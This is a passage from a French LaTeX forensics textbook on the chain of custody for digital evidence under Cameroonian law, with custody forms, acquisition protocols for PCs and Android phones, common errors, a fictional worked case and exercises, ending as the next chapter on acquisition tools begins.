enregistrant chaque personne ayant eu accès à une preuve, chaque action
effectuée sur cette preuve, et chaque transfert de cette preuve entre
deux personnes, depuis le moment de sa collecte jusqu'à sa présentation
devant la juridiction compétente. La chaîne de custody est la condition
nécessaire de l'\textbf{authenticité} d'une preuve~: elle permet de prouver
que l'objet présenté à l'audience est bien celui qui a été saisi sur la
scène de crime, sans modification.
\end{boxdef}

\subsection{Pourquoi la chaîne de custody prime sur l'analyse technique}

Un rapport d'analyse de 100~pages, produit par les meilleurs outils du
monde, avec des conclusions irréfutables sur le plan technique, perd toute
valeur probatoire si on ne peut pas prouver que l'evidence analysée est
bien celle saisie sur la scène de crime. Voici pourquoi~:

\begin{enumerate}
    \item \textbf{Le tribunal ne voit pas la scène de crime}~: il ne peut
          évaluer les preuves que sur la base des documents qui lui sont
          soumis. Si ces documents ne prouvent pas l'intégrité de la preuve,
          la preuve n'existe pas juridiquement.
    \item \textbf{La défense cherche la rupture}~: un avocat compétent
          examinera systématiquement la chaîne de custody pour trouver
          une période non documentée, un transfert non signé, un hash
          non calculé. Une seule lacune peut suffire.
    \item \textbf{La contamination peut être involontaire}~: dans l'affaire
          MBONGO, l'OPJ n'avait pas l'intention de contaminer les preuves~;
          il ne savait simplement pas que d'allumer le PC entraînerait
          des modifications automatiques. L'ignorance ne protège pas.
\end{enumerate}

\begin{boxCRO}
\textbf{Analyse CRO --- La chaîne de custody}

La chaîne de custody est le mécanisme qui maximise $\mathcal{O}$
(opposabilité) en construisant une preuve que l'evidence n'a pas été
altérée. Elle a un coût~: $\mathcal{R}$ peut être légèrement réduite
(certaines preuves volatiles se perdent pendant le temps de documentation)
et $\mathcal{C}$ est engagée (la documentation révèle qui a eu accès).

Ce coût est non seulement acceptable, il est \emph{constitutif}~: une preuve
dont la custody n'est pas documentée est une preuve qui n'existe pas
juridiquement, quelle que soit sa valeur technique.

\cro{$\downarrow$ assumé}{$\sim$ légère contrainte}{$\uparrow\uparrow$ maximisé}
\end{boxCRO}

% ============================================================================
\section{Cadre Légal Camerounais de la Custody}
\label{sec:custody-legal}
% ============================================================================

\subsection{Articles~52--59 de la Loi~2010/012~: les perquisitions numériques}

La \loicam{2010/012} consacre ses articles~52--59 aux perquisitions et saisies
en matière de cybersécurité. Ces articles définissent le cadre légal de la
collecte de preuves numériques au Cameroun. Leur maîtrise est obligatoire
pour tout OPJ intervenant sur une scène numérique.

\begin{boxjuris}
\textbf{Article~52 --- Autorisation de perquisition~:}
\begin{quote}
Les officiers de police judiciaire peuvent, dans le cadre de la recherche des
infractions \textit{[...]} procéder à la perquisition des systèmes informatiques
et des réseaux de communications électroniques, ainsi qu'à la saisie des données
informatiques qui s'y trouvent, sur autorisation du procureur de la République
ou du juge d'instruction.
\end{quote}
\textbf{Implication opérationnelle~:} toute perquisition numérique exige une
autorisation préalable du procureur ou du juge. Une investigation menée sans
cette autorisation produit des preuves irrecevables, quelles que soient leur
qualité technique et leur pertinence.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~53, alinéa~1 --- Copies en présence des parties~:}
\begin{quote}
Les perquisitions \textit{[...]} peuvent porter sur des copies réalisées en
présence des personnes qui assistent à la perquisition.
\end{quote}
\textbf{Implication opérationnelle~:} l'acquisition forensique (création de
l'image E01) doit être réalisée en présence du détenteur ou de son représentant.
C'est la traduction légale du rôle DEFR d'ISO~27037~: l'acquisition est un
acte public, transparent, documenté. L'absence des parties pendant l'acquisition
peut suffire à faire contester l'authenticité.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~55 --- Saisie des données~:}
\begin{quote}
Les données informatiques saisies sont immédiatement copiées et une copie
est remise contre décharge au détenteur. Le support original est restitué
après réalisation de la copie, sauf décision contraire du juge compétent.
\end{quote}
\textbf{Implication opérationnelle~:} en règle générale, l'OPJ acquiert une
copie forensique (image E01) et restitue l'original. Il ne \emph{saisit}
l'original que sur décision judiciaire. Cela signifie que le hash de
l'original doit être calculé \emph{avant} sa restitution et conservé comme
référence d'intégrité.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~57 --- Réquisitions aux opérateurs~:}
\begin{quote}
Les officiers de police judiciaire peuvent requérir tout opérateur de
communications électroniques, tout fournisseur de services de communication
au public en ligne \textit{[...]} de lui communiquer les données techniques
relatives à l'identification des numéros d'abonnement ou de connexion,
les données relatives au trafic \textit{[...]}.
\end{quote}
\textbf{Implication opérationnelle~:} les logs d'opérateur (MTN, Orange,
Camtel) et les données des plateformes (Meta, Google, WhatsApp) peuvent être
obtenus par réquisition judiciaire. La réponse de l'opérateur constitue une
preuve numérique soumise aux mêmes règles de custody que toute autre evidence.
\end{boxjuris}

\subsection{Tableau de correspondance~: Loi~2010/012 et ISO~27037}

\begin{tableaucours}{p{3.2cm}p{5.5cm}p{4.0cm}}{%
    \tableauHeader{Article Loi~2010} &
    \tableauHeader{Exigence légale} &
    \tableauHeader{Correspondance ISO~27037}
}
Art.~52 & Autorisation judiciaire préalable &
    QG1 du PIU (mandat validé) \\
Art.~53 al.~1 & Copie réalisée en présence des parties &
    DEFR~: acquisition transparente et documentée \\
Art.~55 & Copie immédiate, original restitué & Hash avant restitution~;
    principe 3-2-1 (E5 PIU) \\
Art.~57 & Réquisitions aux opérateurs &
    Collection phase NIST SP~800-86 \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~8.1 --- Correspondance Loi~2010/012
et standards forensiques internationaux}
\end{center}

% ============================================================================
\section{Le Formulaire de Chaîne de Custody~: Anatomie et Utilisation}
\label{sec:custody-formulaire}
% ============================================================================

\subsection{Principe général~: le formulaire commence au premier contact}

Le formulaire de custody ne se remplit pas après l'acquisition. Il commence
au moment où l'OPJ pose les yeux sur l'evidence --- avant même de la toucher.
La première entrée est la \textbf{description visuelle initiale}, réalisée
sans manipulation. Toutes les entrées suivantes doivent être horodatées et
signées à mesure qu'elles se produisent, pas reconstituées a posteriori.

\subsection{Formulaire type PNC --- version académique complète}

\begin{boxcustody}
\begin{center}
{\bfseries\color{CouleurPrimaire} FORMULAIRE DE CHAÎNE DE CUSTODY}\\[0.5ex]
{\small République du Cameroun --- Police Nationale --- Direction des Investigations}
\end{center}
\vspace{0.5ex}
\begin{tabular}{p{4cm}p{3.5cm}p{4cm}}
\textbf{N° de dossier~:} & \underline{\hspace{3cm}} &
\textbf{N° d'evidence~:} \underline{\hspace{2cm}} \\[0.6ex]
\textbf{Affaire~:} & \multicolumn{2}{l}{\underline{\hspace{7cm}}} \\[0.6ex]
\textbf{Date de collecte~:} & \underline{\hspace{3cm}} &
\textbf{Heure~:} \underline{\hspace{2cm}} \\[0.6ex]
\end{tabular}
\vspace{0.5ex}
\textbf{Description physique de l'evidence~:}\\
Marque~: \underline{\hspace{3.5cm}}
Modèle~: \underline{\hspace{3.5cm}}
N° de série~: \underline{\hspace{3.5cm}}\\
Couleur~: \underline{\hspace{3cm}}
État~: \underline{\hspace{5cm}} \\[0.5ex]
\textbf{Lieu de collecte~:} \underline{\hspace{6cm}}\\[0.5ex]
\textbf{Collecté par~:} Nom~: \underline{\hspace{3cm}}
Grade/matricule~: \underline{\hspace{3cm}}\\[0.5ex]
\textbf{Hash MD5 de l'original~:}\\
\texttt{\underline{\hspace{10cm}}}\\[0.3ex]
\textbf{Hash SHA-256 de l'original~:}\\
\texttt{\underline{\hspace{10cm}}}\\[0.5ex]
\textbf{Hash MD5 de l'image forensique~:}\\
\texttt{\underline{\hspace{10cm}}}\\[0.3ex]
\textbf{Hash SHA-256 de l'image forensique~:}\\
\texttt{\underline{\hspace{10cm}}}\\[0.5ex]
\textbf{Intégrité vérifiée~:}
$\square$~OUI --- les hash correspondent
\quad $\square$~NON --- acquisition à reprendre\\[0.5ex]
\textbf{Outil d'acquisition~:} Nom~: \underline{\hspace{3cm}}
Version~: \underline{\hspace{2cm}}
OS hôte~: \underline{\hspace{2.5cm}}\\[0.8ex]
\textbf{TRANSFERTS DE CUSTODY~:}\\[0.3ex]
\begin{tabular}{p{2.8cm}p{2.8cm}p{2.0cm}p{3.5cm}}
De & À & Date/Heure & Raison \\
\underline{\hspace{2.6cm}} & \underline{\hspace{2.6cm}} &
\underline{\hspace{1.8cm}} & \underline{\hspace{3.3cm}} \\[0.4ex]
\underline{\hspace{2.6cm}} & \underline{\hspace{2.6cm}} &
\underline{\hspace{1.8cm}} & \underline{\hspace{3.3cm}} \\[0.4ex]
\underline{\hspace{2.6cm}} & \underline{\hspace{2.6cm}} &
\underline{\hspace{1.8cm}} & \underline{\hspace{3.3cm}} \\
\end{tabular}
\\[0.8ex]
\textbf{Signature du collecteur~:} \underline{\hspace{5cm}}
\quad Date~: \underline{\hspace{2.5cm}}
\end{boxcustody}

\subsection{Champ par champ~: comment remplir correctement}

\begin{tableaucours}{p{3.5cm}p{8.0cm}}{%
    \tableauHeader{Champ} &
    \tableauHeader{Comment le remplir --- erreurs fréquentes}
}
N° de dossier & Numéro du parquet ou de l'unité~; cohérent avec tous les
    documents du dossier. Ne jamais laisser vide. \\
N° d'evidence & Numérotation séquentielle dans le dossier (EV-001, EV-002~\ldots).
    Ne jamais renuméroter un bien déjà enregistré. \\
Description physique & Suffisamment précise pour qu'un tiers puisse
    identifier l'objet sans l'avoir vu~: marque, modèle, numéro de série,
    couleur, rayures visibles, caches manquants. \\
Hash MD5 + SHA-256 & Calculer les DEUX sur l'original AVANT acquisition~;
    puis les DEUX sur l'image APRÈS acquisition. Les conserver séparément
    de l'image (sur papier et en fichier texte chiffré). \\
Intégrité vérifiée & Cocher OUI uniquement si hash source = hash image.
    Si NON~: stopper, identifier la cause, recommencer l'acquisition. \\
Outil d'acquisition & Nom \emph{exact} + version \emph{exacte}.
    ``FTK Imager'' n'est pas suffisant. ``FTK Imager 4.7.3.81 sur
    Windows~11 Pro~22H2'' est correct. \\
Transferts & Chaque transfert, même temporaire, doit être documenté~:
    remise au laboratoire, transport au greffe, consultation par un avocat,
    retour pour analyse complémentaire. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~8.2 --- Guide de remplissage champ par champ}
\end{center}

% ============================================================================
\section{Protocole de Custody par Type d'Evidence}
\label{sec:custody-protocoles}
% ============================================================================

\subsection{PC allumé~: préserver avant de saisir}

\begin{boxPNC}
\textbf{Protocole PNC --- PC allumé (ordre impératif)}

\begin{enumerate}
    \item \textbf{Photographier l'écran} dans son état actuel avant tout geste.
          Horodatage visible (barre des tâches + montre de l'OPJ en main).
    \item \textbf{Capturer la RAM}~: FTK~Imager~$\to$
          \texttt{File~$\to$~Capture Memory}. Support de destination~:
          clé USB distincte, \emph{jamais le disque interne}.
    \item \textbf{Documenter les connexions réseau}~: \texttt{netstat -ano}
          (CMD) ou \texttt{Get-NetTCPConnection} (PowerShell). Photographier.
    \item \textbf{Éteindre proprement} via le menu Windows.
          \emph{Exception}~: si destruction de données en cours
          (chiffrement actif, suppression rapide), débrancher immédiatement
          et documenter le motif.
    \item \textbf{Activer le write blocker} logiciel~:
          \begin{lstlisting}[language=bash_forensique]
reg add HKLM\SYSTEM\CurrentControlSet\Control\StorageDevicePolicies
    /v WriteProtect /t REG_DWORD /d 1 /f
          \end{lstlisting}
    \item \textbf{Acquérir avec FTK~Imager}~: format E01, métadonnées
          complètes (N° dossier, N° evidence, examinateur).
    \item \textbf{Calculer et documenter les hash} MD5 et SHA-256.
          Remplir le formulaire. Sceller l'original.
\end{enumerate}
\end{boxPNC}

\subsection{PC éteint~: ne pas allumer}

\begin{boxPNC}
\textbf{Protocole PNC --- PC éteint}

\begin{enumerate}
    \item \textbf{Ne pas allumer.} Appuyer sur le bouton Power contamine
          la scène avant même que l'OS soit chargé (BIOS, UEFI, Windows
          Write Cache~: tous modifient des données).
    \item Photographier le matériel sous tous les angles, câbles en place.
    \item Activer le write blocker et retirer physiquement le disque dur
          (ou SSD) pour connexion sur le poste d'acquisition.
    \item Acquérir, hasher, documenter. Sceller l'original.
    \item Si le BIOS requiert un démarrage pour identifier le modèle~:
          démarrer sur un Live CD forensique (SIFT, Kali) qui ne monte
          pas les partitions Windows automatiquement.
\end{enumerate}
\end{boxPNC}

\subsection{Téléphone mobile~: mode avion avant tout}

\begin{boxPNC}
\textbf{Protocole PNC --- Téléphone mobile}

\begin{center}\textbf{RÈGLE~1~: MODE AVION EN PREMIER}\end{center}

\begin{enumerate}
    \item \textbf{Téléphone allumé}~: mode avion immédiat (coupe les signaux
          sans effacer les données). Si écran inaccessible~: sac de Faraday
          ou enveloppe d'aluminium ménager hermétique.
    \item \textbf{Ne pas brancher sur un chargeur} avant isolation~: le
          branchement active la synchronisation (certains appareils déclenchent
          une sauvegarde automatique qui modifie des données).
    \item \textbf{Documenter}~: N° IMEI (\texttt{*\#06\#} ou sous la batterie),
          opérateur, état de l'écran, niveau de batterie estimé.
    \item \textbf{Acquisition ADB (Android, code connu)}~:
          \begin{lstlisting}[language=bash_forensique]
# Vérifier connexion et droits
adb devices
# Extraction du système de fichiers (niveau logique)
adb pull /sdcard/ ./extraction/sdcard/
# Liste des applications installées
adb shell pm list packages -f > apps_list.txt
# Sauvegarde complète (si autorisée)
adb backup -all -apk -shared -f backup_mbongo.ab
          \end{lstlisting}
    \item \textbf{Téléphone chiffré, code inconnu}~: conserver éteint,
          transmettre à un laboratoire spécialisé. Ne pas tenter de bruteforce
          sans autorisation judiciaire (art.~52 \loicam{2010/012}).
\end{enumerate}
\end{boxPNC}

\subsection{Données cloud et réponses opérateurs}

Les preuves obtenues par réquisition (art.~57 \loicam{2010/012}) --- logs
d'opérateur MTN, réponses Meta/Google, journaux CloudTrail --- sont
des preuves numériques soumises aux mêmes exigences de custody~:

\begin{enumerate}
    \item \textbf{Documenter la réquisition}~: numéro, date, autorité
          émettrice, périmètre demandé.
    \item \textbf{Documenter la réception}~: date de réception de la
          réponse, nom du fichier, format.
    \item \textbf{Calculer immédiatement le hash} du fichier reçu.
    \item \textbf{Conserver la chaîne documentaire complète}~:
          réquisition + accusé de réception + réponse + hash.
    \item \textbf{Ne pas modifier le fichier reçu}~: travailler sur une
          copie. Le fichier original reste en custody scellée.
\end{enumerate}

% ============================================================================
\section{Les Cinq Erreurs Fatales de Custody}
\label{sec:custody-erreurs}
% ============================================================================

Ces cinq erreurs sont les plus fréquentes dans les dossiers rejetés par les
tribunaux camerounais. Chacune correspond à une règle de custody violée.

\subsection{Erreur 1~: allumer le PC suspect sans acquisition préalable}

\begin{boxalert}
\textbf{L'erreur de l'affaire MBONGO.}

Un OPJ allume l'ordinateur du suspect ``pour constater les faits''. Windows
monte les partitions, crée des fichiers temporaires (\texttt{pagefile.sys},
\texttt{hiberfil.sys}), met à jour le registre, modifie les horodatages d'accès
NTFS. Le hash du disque avant et après allumage diffère. La preuve est
contaminée.

\textbf{Règle absolue~:} sur un PC éteint, ne jamais allumer avant d'avoir
activé le write blocker. Sur un PC allumé, capturer la RAM en premier,
\emph{puis} éteindre proprement, \emph{puis} acquérir le disque.
\end{boxalert}

\subsection{Erreur 2~: travailler sur l'evidence originale}

\begin{boxalert}
\textbf{Analyser directement sur le disque original ou sur l'image sans
write blocker.}

Autopsy modifie-t-il les données en les lisant~? Non, si l'image E01 est
montée en lecture seule. Mais si l'OPJ ouvre l'image avec Windows Explorer,
il crée des fichiers \texttt{Thumbs.db} et met à jour les horodatages d'accès.

\textbf{Règle~:} toute analyse doit être conduite~:
\begin{enumerate}
    \item sur une \emph{copie} de l'image forensique~;
    \item montée en \emph{lecture seule} (Autopsy le fait automatiquement)~;
    \item l'original physique est scellé et inaccessible sauf sur autorisation.
\end{enumerate}
\end{boxalert}

\subsection{Erreur 3~: le transfert non documenté}

\begin{boxalert}
\textbf{``J'ai confié l'ordinateur à mon collègue pendant 2 heures.''}\\
Ce transfert non documenté crée une période de custody inconnue.
L'avocat de la défense peut arguer que l'ordinateur a été manipulé
pendant ces deux heures.

\textbf{Règle~:} tout transfert d'une evidence entre deux personnes, même
temporaire, même entre collègues du même service, est documenté~: date,
heure, raison, signatures des deux parties. Si le transfert a eu lieu sans
documentation~: documenter le fait du transfert a posteriori en indiquant
les circonstances, et re-vérifier l'intégrité par hachage avant et après.
\end{boxalert}

\subsection{Erreur 4~: oublier les versions d'outils}

\begin{boxalert}
\textbf{``Analysé avec Autopsy'' dans le rapport.}

L'avocat demande~: quelle version~? Quel système d'exploitation~? Si
l'analyste ne le sait pas, l'expert de la partie adverse peut arguer que
la version utilisée avait un bug connu qui produisait de faux positifs sur
ce type de fichier.

\textbf{Règle~:} documenter systématiquement dans le formulaire de custody~:
\begin{itemize}
    \item Nom de l'outil (ex.~: FTK Imager)
    \item Version exacte (ex.~: 4.7.3.81)
    \item Système d'exploitation hôte (ex.~: Windows~11 Pro~22H2, build 22621)
    \item Date d'utilisation
\end{itemize}
\end{boxalert}

\subsection{Erreur 5~: les hash non calculés ou non conservés séparément}

\begin{boxalert}
\textbf{``Le hash est dans l'image E01.''}\\
Insuffisant. Si l'image E01 est l'objet de la contestation, le hash qui y
est intégré n'est pas une preuve indépendante.

\textbf{Règle~: les hash doivent être conservés séparément de l'image,
en au moins deux endroits distincts~:}
\begin{enumerate}
    \item Manuscrit sur le formulaire papier de custody (signé et daté)~;
    \item Dans un fichier texte chiffré sur un support distinct~;
    \item Optionnel niveau avancé~: horodatage blockchain ou tiers de confiance.
\end{enumerate}
La règle~: si demain l'image E01 disparaît, les hash doivent subsister
ailleurs pour permettre de certifier une copie de sauvegarde.
\end{boxalert}

% ============================================================================
\section{Custody et Scénario MBONGO~: l'Investigation Correcte}
\label{sec:custody-mbongo}
% ============================================================================

Voici la reconstitution complète et correcte de l'affaire MBONGO du Prologue,
avec le formulaire de custody rempli correctement.

\begin{boxscenario}{Affaire MBONGO --- Formulaire de custody complet}
\textbf{Evidence EV-001 --- PC portable Windows de MBONGO Joseph}

\begin{tabular}{p{4cm}p{3cm}p{4cm}}
\textbf{N° dossier~:} & DOS-2026-034 &
\textbf{N° evidence~:} EV-001 \\
\textbf{Date collecte~:} & 15/03/2026 & \textbf{Heure~:} 14h22 \\
\end{tabular}

\textbf{Description~:} Dell Inspiron 15 3000, S/N GF8T3Y2, noir, rayure 3~cm
sur le bord gauche, autocollant ``SONATRAV'' en bas à gauche.\\

\textbf{Lieu~:} Bureau comptabilité, 3\textsuperscript{e} étage, SONATRAV SA,
Akwa, Douala.\\

\textbf{Collecté par~:} OPJ NKENG Éric, Matricule PNC 4471-B, DCPJ Douala.\\

\textbf{État initial~:} PC allumé, déverrouillé, fenêtre navigateur Edge
ouverte sur portail UBA.\\

\textbf{Actions pré-acquisition~:}
\begin{enumerate}
    \item 14h22 --- Photographies de l'écran (8 photos, horodatées).
    \item 14h24 --- Capture RAM avec FTK~Imager~4.7.3.81~:
          fichier \texttt{MBONGO\_RAM\_20260315.mem} (16~Go).
    \item 14h41 --- \texttt{netstat -ano} documenté (2~connexions ESTABLISHED).
    \item 14h43 --- Arrêt propre Windows.
    \item 14h50 --- Write blocker logiciel activé (registre~: WriteProtect=1).
\end{enumerate}

\textbf{Acquisition~:} FTK~Imager~4.7.3.81, Windows~11 Pro~22H2, format~E01.\\
Durée~: 47~minutes (15h03--15h50). Support destination~: HDD externe 2~To,
S/N WD-WXL1A89K3456.\\

\hash{MD5 original}{a3f7b29c8e1d4f56a2c8b7e3d9f0a142}\\
\hash{SHA-256 original}{3d9c8f2b7e4a1c6d5f8e2b9a7c4d3f1e6b8a2c5d7f9e1b3a4c6d8f0e2b4a6c8}\\
\hash{MD5 image}{a3f7b29c8e1d4f56a2c8b7e3d9f0a142}\\
\hash{SHA-256 image}{3d9c8f2b7e4a1c6d5f8e2b9a7c4d3f1e6b8a2c5d7f9e1b3a4c6d8f0e2b4a6c8}\\

\textbf{Intégrité~:} $\checkmark$~OUI --- hash identiques. Acquisition valide.\\

\textbf{Scellé~:} sachet inviolable n°~DL-2026-0347, 15h52, signature OPJ NKENG.\\

\textbf{Transfert~:} De NKENG~$\to$~Dépôt DCPJ Douala.
Date~: 15/03/2026 17h10. Raison~: stockage sécurisé. Signatures : NKENG +
Responsable dépôt OPJ BIYA Marie.
\end{boxscenario}

\begin{boxscenario}{Affaire MBONGO --- Evidence EV-002 --- Téléphone Android}
\textbf{Evidence EV-002 --- Samsung Galaxy A53 de MBONGO Joseph}

\textbf{Actions~:}
\begin{enumerate}
    \item 14h23 --- Mode avion activé (téléphone déverrouillé, écran actif).
    \item 14h23 --- Photographié~: IMEI~: 357128094771034 visible sur l'écran
          (\texttt{*\#06\#}).
    \item 15h55 --- Extraction ADB~: \texttt{adb pull /sdcard/}
          (\texttt{1~447 fichiers extraits}).
    \item 16h10 --- Hash SHA-256 du répertoire d'extraction~: calculé.
    \item 16h12 --- Scellé~: sachet inviolable n°~DL-2026-0348.
\end{enumerate}

L'ensemble de l'extraction est intégré au dossier avec le formulaire de
custody EV-002 signé par OPJ NKENG.
\end{boxscenario}

% ============================================================================
\section{Custody et Admissibilité~: le Chemin vers le Tribunal}
\label{sec:custody-admissibilite}
% ============================================================================

\subsection{Les quatre conditions d'admissibilité revisitées}

La formule d'admissibilité posée au Chapitre~\ref{chap:fond-theo} prend ici
son sens concret~:

\begin{equation}
\mathrm{Admissible}(P) \iff
\underbrace{\mathrm{Légale}(P)}_{\text{art.~52--59}}
\;\wedge\;
\underbrace{\mathrm{Intègre}(P)}_{\text{hash identiques}}
\;\wedge\;
\underbrace{\mathrm{Authentique}(P)}_{\text{custody continue}}
\;\wedge\;
\underbrace{\mathrm{Pertinente}(P)}_{\text{lien avec les faits}}
\end{equation}

\begin{tableaucours}{p{2.8cm}p{4.5cm}p{5.0cm}}{%
    \tableauHeader{Condition} &
    \tableauHeader{Ce que le tribunal vérifie} &
    \tableauHeader{Document qui le prouve}
}
Légalité & Autorisation judiciaire préalable (art.~52)~;
    absence d'actes coercitifs illicites &
    Réquisition ou mandat judiciaire signé \\
Intégrité & Hash source = hash image~;
    aucune modification après acquisition &
    Formulaire custody + hash conservés séparément \\
Authenticité & Chaîne de custody continue depuis la scène~;
    chaque transfert documenté &
    Formulaire custody complet + signatures \\
Pertinence & Lien démontré entre l'evidence et les faits ~;
    rapport forensique documentant les constatations &
    Rapport forensique (section Constatations) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~8.3 --- Conditions d'admissibilité
et documents probatoires correspondants}
\end{center}

\subsection{Ce que l'avocat de la défense cherche --- et comment s'y préparer}

Un avocat de la défense compétent examinera systématiquement~:
\begin{enumerate}
    \item \textbf{L'autorisation judiciaire}~: est-elle antérieure à l'acquisition~?
          Son périmètre couvre-t-il ce qui a été saisi~?
    \item \textbf{Les hash}~: sont-ils calculés sur l'original avant acquisition~?
          Sont-ils identiques entre original et image~?
    \item \textbf{Les périodes non documentées}~: y a-t-il un moment où l'evidence
          n'était pas en custody documentée~? Qui l'avait~? Où~?
    \item \textbf{Les versions d'outils}~: les outils utilisés avaient-ils des
          bugs connus sur ce type de fichier à cette date~?
    \item \textbf{La présence des parties}~: l'acquisition a-t-elle été réalisée
          en présence du détenteur (art.~53 al.~1)~?
\end{enumerate}

Pour chacun de ces points, la réponse est dans le formulaire de custody.
Un formulaire complet et signé est la meilleure défense contre toutes
ces attaques.

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item La \textbf{chaîne de custody} est la condition de l'\textbf{authenticité}~:
          elle prouve que l'evidence présentée au tribunal est bien celle saisie
          sur la scène, sans modification.

    \item En droit camerounais~: art.~52 (\textbf{autorisation judiciaire}),
          art.~53 al.~1 (\textbf{acquisition en présence des parties}),
          art.~55 (\textbf{copie + restitution de l'original}),
          art.~57 (\textbf{réquisition aux opérateurs}).

    \item Le \textbf{formulaire de custody} commence au premier contact,
          pas après l'acquisition. Champs obligatoires~: description physique,
          hash MD5+SHA-256 (original ET image), outil+version, tous les transferts.

    \item \textbf{Cinq erreurs fatales}~: allumer le PC sans write blocker~;
          travailler sur l'original~; transfert non documenté~; version d'outil
          non renseignée~; hash non conservés séparément de l'image.

    \item \textbf{Les hash doivent être conservés séparément}~: sur le formulaire
          papier signé ET dans un fichier texte sur support distinct~; jamais
          seulement dans l'image E01.

    \item La chaîne de custody maximise $\mathcal{O}$ (opposabilité) au coût
          d'une légère contrainte sur $\mathcal{C}$ et $\mathcal{R}$~; ce coût
          est non seulement acceptable mais constitutif de l'admissibilité.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~8.1 --- Diagnostic de custody \niveaubase}]
Pour chacune des situations suivantes, identifiez la violation de custody
et son impact sur l'admissibilité~:
\begin{enumerate}[(a)]
    \item Un OPJ saisit un téléphone Android, le branche sur son chargeur
          pendant 20~minutes en attendant les renforts, puis l'emballe.
    \item Le rapport forensique indique~: \textit{``Hash SHA-256~:
          3d9c8f2b...''}. Pas de hash MD5. Pas de hash de l'original.
    \item L'evidence a été transportée du dépôt au laboratoire par un
          OPJ~; aucune entrée dans le formulaire pour ce transport.
    \item L'analyste a ouvert l'image E01 avec Windows Explorer pour
          naviguer rapidement dans les fichiers avant d'ouvrir Autopsy.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~8.2 --- Remplissage de formulaire \niveaumoyen}]
L'Opération TANGUE (Chapitre~\ref{chap:gr-affaires}) a produit les
éléments suivants lors de l'arrestation de BELLO Armand~:
\begin{itemize}
    \item PC portable HP EliteBook 840, S/N CND7382741, allumé,
          verrouillé par code PIN~;
    \item Clé USB Kingston 16~Go bleue, S/N non visible sur l'objet,
          branchée dans le PC~;
    \item Téléphone Samsung Galaxy S22, allumé, déverrouillé.
\end{itemize}
Rédigez le formulaire de custody pour l'evidence EV-001 (PC HP) en
détaillant~: (a)~les actions pré-acquisition dans l'ordre correct,
(b)~les informations à remplir champ par champ, (c)~le protocole
d'acquisition compte tenu de l'état du PC (allumé, verrouillé).
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~8.3 --- Défense en contre-interrogatoire \niveauexpert}]
Vous êtes l'expert forensique dans l'affaire MVOM. L'avocat de TRANSBOIS SA
(qui cherche à contester votre analyse pour réduire sa responsabilité)
vous pose les questions suivantes~:
\begin{enumerate}[(a)]
    \item \textit{``Comment pouvez-vous prouver que l'image E01 que vous avez
          analysée est bien celle du serveur de TRANSBOIS et non une image
          que vous avez préparée~?''}
    \item \textit{``Le serveur était allumé lors de la saisie. Quelle
          modification du disque a été causée par les actions que vous avez
          menées avant d'acquérir l'image~?''}
    \item \textit{``Vous avez utilisé Volatility~3 pour analyser la RAM.
          Cette version avait-elle des bugs connus en mars~2026 sur les
          systèmes Windows~Server~2022~?''}
\end{enumerate}
Rédigez vos réponses telles que vous les donneriez à l'audience.
Pour chaque réponse, identifiez le document de custody qui vous permet
de l'étayer.
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:acq} approfondit les
\textbf{outils et techniques d'acquisition}~: FTK~Imager en détail,
formats d'image forensique (E01, DD, AFF), write blockers matériels et
logiciels, acquisition de mémoire RAM, et acquisition mobile avancée.
C'est la mise en \oe uvre technique de ce que ce chapitre a établi
sur le plan procédural.
\end{boxinfo}
       
        % ============================================================================
% Fichier  : partie2/P02_C09_outils_acquisition.tex
% Titre    : Outils et Techniques d'Acquisition
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% ============================================================================

\chapter{Outils et Techniques d'Acquisition}
\label{chap:acq}

\epigraph{%
    « By approaching each case methodically, you can evaluate the evidence
    thoroughly and document the chain of evidence. »%
}{--- Amelia Phillips}

\niveauChapitre{Intermédiaire}{%
    Notions de systèmes de fichiers et de ligne de commande recommandées.
    Lecture du Chapitre~\ref{chap:custody} obligatoire~: ce chapitre met
    en \oe uvre les procédures de custody.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser le \termecle{write blocker} matériel et logiciel~:
          principe, activation, vérification.
    \item Conduire une acquisition forensique complète avec FTK~Imager~:
          formats E01, DD~; disque, RAM et mobile.
    \item Comprendre les cinq formats d'image forensique et savoir choisir
          le format adapté au contexte.
    \item Extraire et analyser les données d'un téléphone Android avec ADB.
    \item Conduire une analyse mémoire de base avec Volatility~3.
    \item Analyser une capture réseau avec Wireshark pour identifier
          des communications suspectes.
    \item Appliquer la grille CRO à chaque décision technique d'acquisition.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section{Le Write Blocker~: Protection Absolue de l'Evidence}
\label{sec:write-blocker}
% ============================================================================

\subsection{Principe et nécessité}

Le \termecle{write blocker}\index{write blocker} est un dispositif ---
matériel ou logiciel --- qui permet de lire un support numérique en
interdisant toute écriture. Sans write blocker, le simple branchement
d'un disque sur un PC Windows déclenche une cascade invisible de
modifications~: création de fichiers temporaires, mise à jour de la
base de registre, modification des horodatages d'accès NTFS. En
quelques secondes, l'evidence est contaminée.

\begin{equation}
\text{Write blocker} \implies
\forall\, \text{opération d'écriture} \to \texttt{DENIED}
\quad\text{pendant toute la durée de l'acquisition}
\label{eq:write-blocker}
\end{equation}

\subsection{Write blocker matériel}

Le write blocker matériel est un boîtier physique qui s'intercale entre
le support à acquérir et le poste d'acquisition. C'est le standard de
référence~: indépendant du système d'exploitation, il ne peut pas être
contourné par un bug logiciel.

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{5.0cm}}{%
    \tableauHeader{Modèle de référence} &
    \tableauHeader{Interfaces} &
    \tableauHeader{Usage}
}
Tableau Forensics WiebeTech & SATA, IDE, SAS, USB, SD &
    Standard FBI~; \textasciitilde{}~500~USD \\
ICS Image MASSter Solo & SATA, IDE, USB &
